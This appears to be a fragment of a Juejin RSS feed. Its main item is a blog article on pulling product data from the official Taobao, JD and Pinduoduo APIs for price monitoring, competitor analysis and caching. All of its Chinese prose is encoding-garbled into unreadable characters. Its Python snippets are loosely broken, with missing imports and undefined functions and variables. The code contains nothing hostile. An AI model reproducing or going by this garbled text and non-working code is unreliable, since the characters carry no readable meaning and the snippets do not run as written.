<p>å¿«å»åŠ¨æ‰‹å®ç°å§ï¼åˆ«å¿˜äº†ç»™ä½ çš„é¡¹ç›®èµ·ä¸ªé…·ç‚«çš„åå­—ï½ ğŸš€âœ¨</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è§£é”æ·˜å®äº¬ä¸œæ‹¼å¤šå¤šAPIï¼Œè®©ç”µå•†æ•°æ®ä¸ºä½ æ‰€ç”¨]]></title>    <link>https://juejin.cn/post/7576994308273471507</link>    <guid>https://juejin.cn/post/7576994308273471507</guid>    <pubDate>2025-11-27T06:13:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576994308273471507" data-draft-id="7577171133444145188" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è§£é”æ·˜å®äº¬ä¸œæ‹¼å¤šå¤šAPIï¼Œè®©ç”µå•†æ•°æ®ä¸ºä½ æ‰€ç”¨"/> <meta itemprop="keywords" content="API"/> <meta itemprop="datePublished" content="2025-11-27T06:13:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”µå•†api2467742810"/> <meta itemprop="url" content="https://juejin.cn/user/2147781265591291"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è§£é”æ·˜å®äº¬ä¸œæ‹¼å¤šå¤šAPIï¼Œè®©ç”µå•†æ•°æ®ä¸ºä½ æ‰€ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2147781265591291/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”µå•†api2467742810
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:13:23.000Z" title="Thu Nov 27 2025 06:13:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>â€‹</p>
<p>åœ¨æ•°å­—åŒ–æ—¶ä»£ï¼Œç”µå•†å¹³å°å·²æˆä¸ºå•†ä¸šæ´»åŠ¨çš„é‡è¦é˜µåœ°ã€‚æ·˜å®ã€äº¬ä¸œã€æ‹¼å¤šå¤šä¸‰å¤§å·¨å¤´æ±‡èšäº†æµ·é‡å•†å“ä¿¡æ¯å’Œæ¶ˆè´¹è€…è¡Œä¸ºæ•°æ®ã€‚è‹¥èƒ½æœ‰æ•ˆè·å–å¹¶åˆ©ç”¨è¿™äº›æ•°æ®ï¼Œä¼ä¸šå°†è·å¾—å¸‚åœºç«äº‰çš„å…³é”®ä¼˜åŠ¿ã€‚æœ¬æ–‡å°†æ¢è®¨å¦‚ä½•é€šè¿‡å®˜æ–¹APIåˆæ³•è·å–ç”µå•†æ•°æ®ï¼Œå¹¶å°†å…¶è½¬åŒ–ä¸ºå•†ä¸šä»·å€¼ã€‚</p>
<h4 data-id="heading-0">ä¸€ã€ç”µå•†æ•°æ®çš„ä»·å€¼æ´¼åœ°</h4>
<p>ç”µå•†å¹³å°æ¯æ—¥äº§ç”Ÿï¼š</p>
<ul>
<li>åƒä¸‡çº§å•†å“æ›´æ–°æ•°æ®</li>
<li>äº¿çº§ç”¨æˆ·è¡Œä¸ºè½¨è¿¹</li>
<li>å®æ—¶ä»·æ ¼æ³¢åŠ¨ä¿¡æ¯ è¿™äº›æ•°æ®è•´å«æ¶ˆè´¹è€…åå¥½ã€å¸‚åœºè¶‹åŠ¿ã€ç«å“ç­–ç•¥ç­‰å…³é”®å•†ä¸šæƒ…æŠ¥ã€‚ä¼ ç»Ÿçˆ¬è™«æ–¹å¼é¢ä¸´æ³•å¾‹é£é™©å’ŒæŠ€æœ¯å£å’ï¼Œè€Œå®˜æ–¹APIæä¾›äº†åˆè§„çš„æ•°æ®è·å–é€šé“ã€‚</li>
</ul>
<h4 data-id="heading-1">äºŒã€APIæ¥å…¥å®æˆ˜</h4>
<p>ä»¥æ·˜å®APIä¸ºä¾‹ï¼Œè·å–å•†å“æ•°æ®çš„åŸºæœ¬æµç¨‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function">import requests

def <span class="hljs-title">fetch_taobao_item</span>(<span class="hljs-params">item_id</span>):
    # è®¤è¯ä¿¡æ¯é…ç½®
    app_key</span> = <span class="hljs-string">'YOUR_APP_KEY'</span>
    app_secret = <span class="hljs-string">'YOUR_APP_SECRET'</span>
    url = <span class="hljs-string">'https://api.taobao.com/router/rest'</span>
    
    <span class="hljs-meta"># æ„é€ è¯·æ±‚å‚æ•°</span>
    <span class="hljs-keyword">params</span> = {
        <span class="hljs-string">'method'</span>: <span class="hljs-string">'taobao.item.get'</span>,
        <span class="hljs-string">'item_id'</span>: item_id,
        <span class="hljs-string">'format'</span>: <span class="hljs-string">'json'</span>,
        <span class="hljs-string">'v'</span>: <span class="hljs-string">'2.0'</span>,
        <span class="hljs-string">'sign_method'</span>: <span class="hljs-string">'md5'</span>,
        <span class="hljs-string">'app_key'</span>: app_key,
        <span class="hljs-string">'timestamp'</span>: str(<span class="hljs-built_in">int</span>(time.time()))
    }
    
    <span class="hljs-meta"># ç”Ÿæˆç­¾å</span>
    <span class="hljs-keyword">params</span>[<span class="hljs-string">'sign'</span>] = generate_sign(<span class="hljs-keyword">params</span>, app_secret)
    
    <span class="hljs-meta"># å‘é€è¯·æ±‚</span>
    response = requests.<span class="hljs-keyword">get</span>(url, <span class="hljs-keyword">params</span>=<span class="hljs-keyword">params</span>)
    <span class="hljs-keyword">return</span> response.json()
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h4 data-id="heading-2">ä¸‰ã€æ•°æ®åº”ç”¨åœºæ™¯</h4>
<ol>
<li>
<p><strong>ä»·æ ¼ç›‘æ§ç³»ç»Ÿ</strong></p>
<pre><code class="hljs language-ini" lang="ini">def monitor_price(item_id):
    while True:
        <span class="hljs-attr">data</span> = fetch_taobao_item(item_id)
        <span class="hljs-attr">current_price</span> = data[<span class="hljs-string">'price'</span>]
        if current_price &lt; threshold_price:
            send_alert_notification()
        time.sleep(3600)  <span class="hljs-comment"># æ¯å°æ—¶æ£€æµ‹ä¸€æ¬¡</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
</li>
<li>
<p><strong>ç«å“åˆ†æçŸ©é˜µ</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin">def competitor_analysis(competitor_ids):
    result = {}
    <span class="hljs-keyword">for</span> cid <span class="hljs-keyword">in</span> competitor_ids:
        <span class="hljs-keyword">data</span> = fetch_taobao_item(cid)
        result[cid] = {
            <span class="hljs-string">'sales'</span>: <span class="hljs-keyword">data</span>[<span class="hljs-string">'sales'</span>],
            <span class="hljs-string">'rating'</span>: <span class="hljs-keyword">data</span>[<span class="hljs-string">'rating'</span>],
            <span class="hljs-string">'promotions'</span>: <span class="hljs-keyword">data</span>[<span class="hljs-string">'promotion_info'</span>]
        }
    <span class="hljs-keyword">return</span> result
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
</li>
<li>
<p><strong>ç”¨æˆ·ç”»åƒæ„å»º</strong></p>
<pre><code class="hljs language-scss" lang="scss">def <span class="hljs-built_in">build_user_profile</span>(user_behavior_data):
    # ä½¿ç”¨ååŒè¿‡æ»¤ç®—æ³•
    user_matrix = <span class="hljs-built_in">create_user_item_matrix</span>(user_behavior_data)
    model = <span class="hljs-built_in">AlternatingLeastSquares</span>(factors=<span class="hljs-number">50</span>)
    model.<span class="hljs-built_in">fit</span>(user_matrix)
    return model.<span class="hljs-built_in">recommend</span>(user_id)
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
</li>
</ol>
<h4 data-id="heading-3">å››ã€å®‰å…¨åˆè§„è¦ç‚¹</h4>
<ol>
<li>
<p>ä¸¥æ ¼éµå¾ªå¹³å°APIè°ƒç”¨é¢‘ç‡é™åˆ¶ï¼š <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>æœ€å¤§è¯·æ±‚æ•°</mtext><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>5000</mn><mi mathvariant="normal">/</mi><mtext>å¤©</mtext></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>æ™®é€šåº”ç”¨Â </mtext><mn>10000</mn><mi mathvariant="normal">/</mi><mtext>å¤©</mtext></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>ä¼ä¸šè®¤è¯</mtext></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">\text{æœ€å¤§è¯·æ±‚æ•°} = \begin{cases} 5000/\text{å¤©} &amp; \text{æ™®é€šåº”ç”¨} \ 10000/\text{å¤©} &amp; \text{ä¼ä¸šè®¤è¯} \end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord text"><span class="mord cjk_fallback">æœ€å¤§è¯·æ±‚æ•°</span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.8em;vertical-align:-0.65em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.97em;"><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"/><span class="mord"><span class="mord">5000/</span><span class="mord text"><span class="mord cjk_fallback">å¤©</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.47em;"><span/></span></span></span></span><span class="arraycolsep" style="width:1em;"/><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.97em;"><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"/><span class="mord"><span class="mord text"><span class="mord cjk_fallback">æ™®é€šåº”ç”¨</span></span><span class="mspace">Â </span><span class="mord">10000/</span><span class="mord text"><span class="mord cjk_fallback">å¤©</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.47em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.97em;"><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"/><span class="mord"><span class="mord text"><span class="mord cjk_fallback">ä¼ä¸šè®¤è¯</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.47em;"><span/></span></span></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></p>
</li>
<li>
<p>æ•æ„Ÿæ•°æ®å¤„ç†åŸåˆ™ï¼š</p>
<ul>
<li>ç”¨æˆ·éšç§æ•°æ®å¿…é¡»è„±æ•å¤„ç†</li>
<li>ä¸å¾—å­˜å‚¨åŸå§‹æ”¯ä»˜ä¿¡æ¯</li>
<li>éµå®ˆGDPRç­‰æ•°æ®ä¿æŠ¤æ³•è§„</li>
</ul>
</li>
<li>
<p>ç¼“å­˜ç­–ç•¥ä¼˜åŒ–ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">from redis <span class="hljs-keyword">import</span> Redis
cache = Redis()

def get_cached_data(key, ttl=<span class="hljs-number">300</span>):
    <span class="hljs-keyword">if</span> cache.exists(key):
        <span class="hljs-keyword">return</span> cache.<span class="hljs-keyword">get</span>(key)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">data</span> = fetch_api_data()
        cache.setex(key, ttl, <span class="hljs-keyword">data</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">data</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
</li>
</ol>
<h4 data-id="heading-4">äº”ã€æ•°æ®ä»·å€¼å‡å</h4>
<p>é€šè¿‡APIè·å–çš„åŸå§‹æ•°æ®éœ€ç»æ·±åº¦åŠ å·¥ï¼š</p>
<ol>
<li>
<p>å»ºç«‹æ—¶é—´åºåˆ—æ¨¡å‹é¢„æµ‹ä»·æ ¼æ³¢åŠ¨ï¼š <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>=</mo><mi>Î±</mi><msub><mi>P</mi><mi>t</mi></msub><mo>+</mo><mi>Î²</mi><msubsup><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msub><mi>Î³</mi><mi>i</mi></msub><msub><mi>S</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">P_{t+1} = \alpha P_t + \beta \sum_{i=1}^{n} \gamma_i S_{i,t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord mathnormal" style="margin-right:0.0037em;">Î±</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.104em;vertical-align:-0.2997em;"/><span class="mord mathnormal" style="margin-right:0.05278em;">Î²</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.05556em;">Î³</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> å…¶ä¸­<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span>ä¸ºä»·æ ¼ï¼Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></span>ä¸ºå½±å“å› ç´ </p>
</li>
<li>
<p>æ„å»ºå•†å“çŸ¥è¯†å›¾è°±ï¼š</p>
<pre><code class="hljs language-css" lang="css">graph LR
<span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[æ‰‹æœº]</span> --&gt; <span class="hljs-selector-tag">B</span><span class="hljs-selector-attr">[å“ç‰Œ]</span>
<span class="hljs-selector-tag">A</span> --&gt; C<span class="hljs-selector-attr">[ä»·æ ¼åŒºé—´]</span>
<span class="hljs-selector-tag">A</span> --&gt; D<span class="hljs-selector-attr">[åŠŸèƒ½ç‰¹æ€§]</span>
<span class="hljs-selector-tag">B</span> --&gt; E<span class="hljs-selector-attr">[è‹¹æœ]</span>
<span class="hljs-selector-tag">B</span> --&gt; F<span class="hljs-selector-attr">[åä¸º]</span>
D --&gt; G<span class="hljs-selector-attr">[5G]</span>
D --&gt; H<span class="hljs-selector-attr">[æ‘„åƒå¤´]</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
</li>
<li>
<p>å¼€å‘æ™ºèƒ½å†³ç­–ç³»ç»Ÿï¼š</p>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">EcommerceDecisionSystem</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, api_client</span>):
        <span class="hljs-variable language_">self</span>.data_source = api_client
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">make_pricing_decision</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, product_id</span>):
        market_data = <span class="hljs-variable language_">self</span>.data_source.get_market_trends()
        cost_data = <span class="hljs-variable language_">self</span>.data_source.get_supply_chain_info()
        <span class="hljs-keyword">return</span> optimize_price(product_id, market_data, cost_data)
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
</li>
</ol>
<h4 data-id="heading-5">ç»“è¯­</h4>
<p>ç”µå•†APIå¦‚åŒæ•°å­—ä¸–ç•Œçš„çŸ³æ²¹é’»äº•å¹³å°ï¼Œåªæœ‰æŒæ¡æ­£ç¡®çš„å¼€é‡‡æŠ€æœ¯ï¼Œæ‰èƒ½è®©æ•°æ®èƒ½æºæºæºä¸æ–­è½¬åŒ–ä¸ºå•†ä¸šåŠ¨åŠ›ã€‚é€šè¿‡æœ¬æ–‡ä»‹ç»çš„æŠ€æœ¯è·¯å¾„ï¼Œä¼ä¸šå¯å»ºç«‹åˆè§„é«˜æ•ˆçš„æ•°æ®è·å–ä½“ç³»ï¼Œå°†æ·˜å®ã€äº¬ä¸œã€æ‹¼å¤šå¤šçš„æ•°æ®é‡‘çŸ¿è½¬åŒ–ä¸ºï¼š</p>
<ul>
<li>å®æ—¶å¸‚åœºæ„ŸçŸ¥èƒ½åŠ›</li>
<li>ç²¾å‡†ç”¨æˆ·æ´å¯Ÿèƒ½åŠ›</li>
<li>æ•æ·å•†ä¸šå†³ç­–èƒ½åŠ› åœ¨æ•°æ®é©±åŠ¨çš„å•†ä¸šæ–°æ—¶ä»£ï¼ŒæŒæ¡APIæŠ€æœ¯å°±æ˜¯æŒæ¡å¸‚åœºç«äº‰çš„åˆ¶é«˜ç‚¹ã€‚</li>
</ul>
<p><strong>æ³¨</strong>ï¼šæœ¬æ–‡ç¤ºä¾‹ä»£ç éœ€é…åˆå„å¹³å°å®˜æ–¹SDKä½¿ç”¨ï¼Œå®é™…å¼€å‘è¯·å‚è€ƒæœ€æ–°APIæ–‡æ¡£ã€‚æ•°æ®è·å–åº”ä¸¥æ ¼éµå®ˆã€Šç½‘ç»œå®‰å…¨æ³•ã€‹åŠç›¸å…³å¹³å°åè®®ã€‚</p>
<p>â€‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¦‚ä½•ä½¿ç”¨ C# å°† RTF è½¬æ¢ä¸º PDF]]></title>    <link>https://juejin.cn/post/7576968345875218459</link>    <guid>https://juejin.cn/post/7576968345875218459</guid>    <pubDate>2025-11-27T06:15:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576968345875218459" data-draft-id="7576918517238693938" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¦‚ä½•ä½¿ç”¨ C# å°† RTF è½¬æ¢ä¸º PDF"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-11-27T06:15:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LSTM97"/> <meta itemprop="url" content="https://juejin.cn/user/2253353867033484"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" 